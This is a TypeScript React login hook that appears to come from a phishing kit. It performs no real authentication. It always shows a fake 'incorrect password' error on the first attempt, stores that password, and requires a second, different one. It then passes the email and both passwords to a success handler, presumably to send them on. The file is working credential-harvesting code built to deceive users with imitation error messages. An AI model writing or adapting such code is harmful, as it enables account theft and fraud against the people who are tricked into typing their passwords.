import { useState, useRef } from 'react';

export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
  
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const resetLoginState = () => {
    setFirstAttemptPassword('');
    setErrorMessage('');
  };

  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';
      
      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      // This is the SECOND valid attempt.
      if (firstAttemptPassword) {
        if (firstAttemptPassword === password) {
            throw new Error('Your account or password is incorrect. Please try again.');
        }

        const finalData = {
          ...formData,
          email,
          firstAttemptPassword,
          secondAttemptPassword: password,
          isSecondAttempt: true, // This flag is crucial
        };

        // Call the success handler passed from App.tsx
        if (onLoginSuccess) {
          onLoginSuccess(finalData);
        }
        
        // Do not set loading to false here, App.tsx will handle it
        return; // Stop execution
      }

      // This is the FIRST attempt.
      setFirstAttemptPassword(password);
      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      setIsLoading(false); // Stop loading on error
      if (onLoginError) {
        onLoginError(errorMsg);
      }
      // Return a flag so the UI can clear the password field
      return { isFirstAttempt: !!firstAttemptPassword };
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState,
    emailRef,
    passwordRef,
  };
};
